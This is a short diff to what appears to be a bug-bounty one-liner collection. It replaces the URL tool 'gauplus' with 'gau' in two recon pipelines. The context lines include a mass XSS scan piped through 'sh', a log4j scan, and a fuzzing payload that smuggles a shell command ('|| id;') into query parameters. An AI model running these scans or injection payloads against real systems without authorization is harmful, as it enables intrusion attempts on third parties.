@@ -127,7 +127,7 @@ subfinder -d hackerone.com -silent -all | httpx -silent | katana -d 5 -silent -e
 ###  Scan All domains using Knoxss
 - [Explained command]
 ```bash
-echo "dominio" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\""}' | sh 
+echo "dominio" | subfinder -silent | gau | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\""}' | sh 
 ```
 
 
@@ -147,7 +147,7 @@ bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u 
 ###  SSTI in qsreplase add "{{7*7}}" (0xJin)
 
 ```bash
-cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+cat subdomains.txt | httpx -silent -status-code | gau --threads 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
 ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 
 ```
